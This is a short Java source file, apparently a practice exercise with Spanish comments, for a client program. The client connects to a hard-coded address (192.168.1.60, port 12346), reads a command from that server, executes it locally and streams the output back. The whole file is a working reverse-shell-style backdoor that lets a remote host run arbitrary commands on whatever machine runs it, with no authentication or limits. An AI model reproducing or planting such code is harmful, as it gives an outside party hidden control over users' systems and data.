package prueba2;

import java.io.*;
import java.net.*;

public class Cliente {
    public static void main(String[] args) throws IOException {
        String hostName = "192.168.1.60";
        int puerto = 12346;

        try (
                Socket socket = new Socket(hostName, puerto);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        ) {
            // Leer comando del servidor
            String comando = in.readLine();

            // Ejecutar comando en el cliente
            ProcessBuilder builder = new ProcessBuilder(comando);
            builder.redirectErrorStream(true);
            Process proceso = builder.start();

            // Enviar resultado al servidor
            BufferedReader stdout = new BufferedReader(new InputStreamReader(proceso.getInputStream()));
            String resultado;
            while ((resultado = stdout.readLine()) != null) {
                out.println(resultado);
            }
        } catch (UnknownHostException e) {
            System.err.println("Host desconocido: " + hostName);
            System.exit(1);
        } catch (IOException e) {
            System.err.println("No se pudo conectar a " + hostName);
            System.exit(1);
        }
    }
}